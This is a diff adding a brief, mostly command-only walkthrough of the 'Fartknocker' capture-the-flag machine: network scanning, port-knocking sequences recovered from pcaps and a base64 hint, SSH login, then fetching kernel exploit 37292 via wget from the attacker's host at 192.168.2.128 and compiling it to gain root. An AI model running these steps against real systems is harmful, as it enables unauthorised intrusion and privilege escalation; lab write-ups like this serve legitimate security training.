@@ -1,0 +1,15 @@
+FARTKNOCKER MAKİNE ÇÖZÜMÜ
+1 - arp-scan --localnet ile IP adresi 192.168.2.133 bulundu.
+2 - nmap -sT -A 192.168.2.133
+3 - http://192.168.2.133 -> pcap1.pcap
+4 - Knock 7000 8000 9000 -> Open 8888, nmap -r -p 7000,8000,9000 192.168.2.133
+5 - nmap -sT -A -p- 192.168.2.133, 8888 open -> http://192.168.2.133/burgerworld/ -> pcap2.pcap
+6 - eins drei drei sieben -> 1 3 3 7
+7 - nmap -r -p 1 192.168.2.133, nmap -r -p 3 192.168.2.133, nmap -r -p 3 192.168.2.133, nmap -r -p 7 192.168.2.133
+8 - http://192.168.2.133/iamcornholio/
+9 - echo " T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK " | base64 -d, Open up SSH: 8888 9999 7777 6666
+10 - nmap -r -p 8888 192.168.2.133, nmap -r -p 9999 192.168.2.133, nmap -r -p 7777 192.168.2.133, nmap -r -p 6666 192.168.2.133
+11 - ssh butthead@192.168.2.133 /bin/bash
+12 - uname -a, searchsploit 'linux 3.13.0', searchsploit -m 37292
+13 - cd /tmp, wget http://192.168.2.128:8000/37292.c
+14 - gcc -o root 37292.c, ./root, whoami
